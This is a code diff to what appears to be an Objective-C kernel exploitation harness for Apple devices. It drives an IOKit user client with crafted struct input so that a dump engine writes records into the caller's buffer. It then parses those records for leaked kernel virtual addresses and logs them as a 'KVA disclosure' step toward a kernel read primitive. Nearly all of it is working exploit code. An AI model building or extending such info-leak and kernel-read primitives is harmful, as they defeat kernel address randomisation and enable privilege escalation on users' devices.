@@ -100,7 +100,7 @@
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v2.6-printfix"
+#define P110_BUILD      @"p110-swapclaim-v2.8-t8150leaklaw"
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
 #define P110_PREFILL_DEF  6     /* the v1 shipped prefill(6) pop-law value   */
@@ -537,6 +537,13 @@ static void p110_leak_queue(void) {
     Lf(@"[leak] QueueCreate sel=6 stIn=0x%x (v5 contract: {1000, sids[1000], flags}) "
        @"kr=0x%x outLen=%zu out0=%016llx (the {u64} input candidate)",
        qsz, krQ, qOutLen, (unsigned long long)qOut[0]);
+    if (krQ == 0xe00002c2) {
+        L(@"[leak] T8150 2c2 law (the 24A435 decode, 2026-11-01): the grammar is"
+          @" BYTE-IDENTICAL to 23F77 (word0 EXACTLY 1000, in 0xFA8, flags bit0 all"
+          @" confirmed) — this 2c2 = the TAGS verdict: >=1 of the 1000 sids failed"
+          @" the live+owned resolution in the deep validator (a preamble failure"
+          @" would print 0x2c9 — the value excludes the root-acquisition leg).");
+    }
 }
 
 static void p110_leak_hexdump(size_t maxn) {
@@ -558,11 +565,77 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
     if (!p110_leak_door()) return NO;
     if (!g_p110_m2queued) p110_leak_queue();
     memset(g_p110_leak_out, 0, sizeof(g_p110_leak_out));
-    uint64_t in64 = g_p110_m2qh;            /* the {u64} 8-byte input law    */
+    /* the in law per SKU — the 24A435 decode (2026-11-01, notes/
+       t8150_m2scaler_contract_decode_20261101.md): CONFIRMED byte law —
+       on T8150 in[0] = the USERLAND BUFFER ADDRESS the async dump
+       engine writes its records into (IOMD withAddressRange base);
+       structureOutput is NEVER written (the zero-out readback = BY
+       DESIGN, not a shape mismatch); (base+count)*0x7c+0x20 dump size;
+       0x2bf = kIOReturnIPCError = the ENGINE-ASLEEP class (not a shape
+       check); 0x2bd = the MD-alloc fail. The 23F77 echo law = the
+       prior on that SKU (verbatim as shipped). */
+    uint64_t in64;
+    LabSku sku8 = [LabDeviceProfile detectedSku];
+    if (sku8 == LabSkuT8150_24A435) {
+        in64 = (uint64_t)(uintptr_t)g_p110_leak_out;   /* OUR buffer */
+    } else {
+        in64 = g_p110_m2qh;                 /* the 23F77 prior */
+    }
     size_t outLen = sizeof(g_p110_leak_out);
     IOReturn kr = g_p110_callStruct(g_p110_m2conn, 8, &in64, sizeof(in64),
                                     g_p110_leak_out, &outLen);
     g_p110_leak_caps++;
+
+    /* ---- the T8150 readback law (decode-confirmed): classify OUR ----
+       buffer, never the untouched structureOutput ---- */
+    if (sku8 == LabSkuT8150_24A435) {
+        uint32_t hA4 = 0; uint16_t cA = 0, cB = 0;
+        memcpy(&hA4, g_p110_leak_out + 4, 4);     /* the +4 = 2 signature */
+        memcpy(&cA, g_p110_leak_out + 0x14, 2);
+        memcpy(&cB, g_p110_leak_out + 0x16, 2);
+        uint64_t rawTok = 0; memcpy(&rawTok, g_p110_leak_out + 0x18, 8);
+        BOOL hdrOk = (kr == 0 && hA4 == 2 && (cA + cB) > 0);
+        int total = hdrOk ? (int)(cA + cB) : 0;
+        if (total > P110_LEAK_SNAP) total = P110_LEAK_SNAP;
+        snap->n = total;
+        snap->recs = (int)((uint32_t)cA + (uint32_t)cB);
+        snap->kv = 0;
+        for (int i = 0; i < total; i++) {
+            const uint8_t *rec = g_p110_leak_out + 0x20 + (size_t)i * 0x7c;
+            uint64_t v18 = 0, v20 = 0;
+            if (rec[1] == 0) memcpy(&v18, rec + 0x18, 8); /* the CONDITIONAL raw law */
+            memcpy(&v20, rec + 0x20, 8);                  /* the unslided KVA class */
+            snap->kv18[i] = v18;
+            snap->kv30[i] = v20;
+            if (p110_kernelish(v18) || p110_kernelish(v20)) snap->kv++;
+        }
+        Lf(@"[leak %@] t8150 law: in={%016llx} = OUR buffer address; out-tensor"
+           @" NEVER written by design; kr=0x%08x (%@) -> header[+4]=0x%08x"
+           @" %@ countA=%u countB=%u headerRaw+0x18=0x%016llx (NO sanitize;"
+           @" a LIVE pointer here = the SLID-law candidate) KVs=%d",
+           tag, (unsigned long long)in64, (unsigned)kr,
+           (kr == 0xe00002bf) ? @"engine-asleep IPCError — NOT a shape check"
+         : (kr == 0xe00002bd) ? @"MD-alloc fail" : @"state",
+           hA4, hdrOk ? @"SIGNATURE=2 (the dump LANDED in our buffer)" :
+                        @"no signature (engine asleep/empty)",
+           cA, cB, (unsigned long long)rawTok, snap->kv);
+        if (print) {
+            for (int i = 0; i < total && i < P110_LEAK_PRINT; i++) {
+                const uint8_t *rec = g_p110_leak_out + 0x20 + (size_t)i * 0x7c;
+                Lf(@"[leak %@] rec[%d] byte1=%u +0x18=%016llx%s +0x20=%016llx%s",
+                   tag, i, rec[1],
+                   (unsigned long long)snap->kv18[i],
+                   p110_kernelish(snap->kv18[i]) ? " KVA" : "",
+                   (unsigned long long)snap->kv30[i],
+                   p110_kernelish(snap->kv30[i]) ? " KVA" : "");
+            }
+            if (snap->kv)
+                L(@"LAW: KVA DISCLOSURE CLASS — not kread (the unslided KVA"
+                  @" fields + the conditional raw; hasKread=NO until a"
+                  @" kread32-class receipt).");
+        }
+        return hdrOk;
+    }
 
     size_t need = P110_LEAK_HDR + P110_LEAK_STRIDE;
     if (kr != KERN_SUCCESS || outLen < need ||
